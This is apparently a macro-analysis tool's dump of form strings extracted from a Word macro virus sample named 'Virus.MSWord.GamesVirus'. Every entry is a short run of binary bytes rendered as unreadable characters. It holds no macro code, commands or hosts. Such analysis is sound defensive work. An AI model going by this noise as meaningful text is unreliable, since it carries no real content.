- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8h��/9�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)i%)i&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!QAJ�.1i79i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!(RRi.1i61i&1a?9i%)Y79a%)i61a&1i.1i%)a%)i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Q%)Y%)a%)i%)i%)i%)i&1a%)a&1a%)a.1i.1i.1i%)i%)a&1i%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!a&1a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y�Ɗ�ΒEk�Fs�!JY3ZqX��O{�<c�*Ry*Rq Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y<cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)AEkya��j��Fsyb��Eky4cyP��EkyMkqUkyUky<cq1JiLcq1JiLcqCZi1JiCZiCZiCZq:RiCZiLcq:Ra:Ra0BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I%)Y&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A/9a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 &1y%)Y%)I	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a&1i%)a8BqJR�%)a.1i	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! SZi0BQ8Ba?9iAJa61a%)a/9Y?9i.1a%)a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y&1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I%)a%)i%)a%)i%)a%)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)i&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y&1i%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!Y%)Y&1a%)a%)Y%)a�Ɗ�Ɗ3Zq3Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y'9Q`��H��5k�!Ji!Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y;Za=k�<cyq��b��=kyO{�EkyNs�W{�G{�<ciMkq(BI1JY;ZiCZqCZqCZiLcqCZiCZinsq:Ra:Ri:RaCZaCZi2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
79a'9YCZy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
80Bi%)Q'9i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
879aVs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1i&1i.1i.1iJR�Tc�.1i&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KZaJRi%)i%)a\cq5)Y79Y61i61a?9i79q%)i%)i%)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I$!Y%)a%)a&1i%)i%)a&1i%)a%)i%)a%)a%)i%)a%)a%)i%)a%)i%)a&1a$!8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a׽�׽�790`��1JYX��H��Ns�<c�4c�4c�Fs�3Zy2RqO{�Mkyr��{��3Zq;Zi<cyW{�Fs�Fs�*Ra;Zq4cq2RY(BQ)JY*RaDcq2Ra2RiKZqCZiCZiLciLciCZi;Zi2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A&1Q&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0%)A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q)A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
00Bi&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(%)A

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A&1Y)Ja'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A(By
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A$!Y&1a{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %)a%)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
61YJR�.1i%)a#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 %) ?9A8BI61YAJQ79I8Bi\ci79a8BQ79a79a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a%)a%)a%)i%)a%)a&1i$!a%)i%)i%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a.1i%)a&1i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!a׽�׽y׽�2RY)Ja=k�Fs�3Zq3Zq4cy<c�Vs�Fs�Fs�P��Ns�b�����W{�MkyNs�Fs�O{�P��>s�!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I3ZqUkq;Za:RaLcqCZq;Zi:Ri;Zi;ZiLcqLcqCZaCZi;Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A1JQCZiCZi:Ra(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I-)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8i��)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(;Z�)Ji1Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ah��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(0Bi61i&1i&1i&1iF18%) SZQ.1A79I8BQ79IBRYJRi9JIAJi.1a$!a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)i%)a%)Y%)a$!a%)i%)i%)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1i%)a%)i%)i.1a$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Yεqεqεq<ca3Zi4cy+ZiFs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BYEk�4c�Fs�O{�W{�W{�r��s��EkyW{�_{�W{�Ek�X��P��Fs�!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I3ZiLcq2Ra!JY2Ra3Za!JQ2RaCZiDciLcqKZa0BQ(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I:RY1JY BI0BQ BI(BQ/9Q1JQ&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8&1Y%)I%)I

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0.18%)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I9Jq

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I2R�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)i.1i%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0@Bq8By&1i%)i&1i&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AJI0BY61Q79IBRY8BQJRYSZiJRY8Bi79i%)i%)i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a%)a%)i%)a&1i%)i%)i%)i&1i%)a%)a%)i%)a&1i&1a%)a79i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 %)Y%) %)I-)(.1079Y"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1a$!Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!YŭiŭiŭiͭqDca;ZiP��=k�!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba!Ji*RqY��Fs�O{�P��s��=ky_{�b��=k�O{�a��P��H��Y��'9Q)JaUky!JY)Ja BQUky1JaCZi2RaLcq:RY&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BQ BQ'9I(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I9JQ'9I/9I&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0Bq&1Q/9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0CZi/9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I.1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 %)a

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Y)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I?9a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)i&1i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AAJy8Bq&1i%)i.1i%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BQ79I61Q61IKZY8BIBRQKZYAJQ%)a-)a.1i&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a%)i%)a%)a&1i%)a%)i%)i%)a%)i$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1i%)i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/9q61(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a$!Y%)Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)aŭaŭaŭiŭaŭa
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BaFs�G{�!Jq Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y*Rq!Jia��>s�G{�X��j�����W{�O{�Ek�<cy=k�H��I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A(BQ BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY(BY)JY)JY(BQ;Za(BY)Ja'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A1JY'9I BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A BQ:Ra1JIDci(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Jy&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8Lcq0Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I/9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8%)ABRq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I1Ji.1i79Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q Ba

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)i&1i0By
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8?9q8By&1i&1i.1i%)i
-------------------------------------------------------------------------------
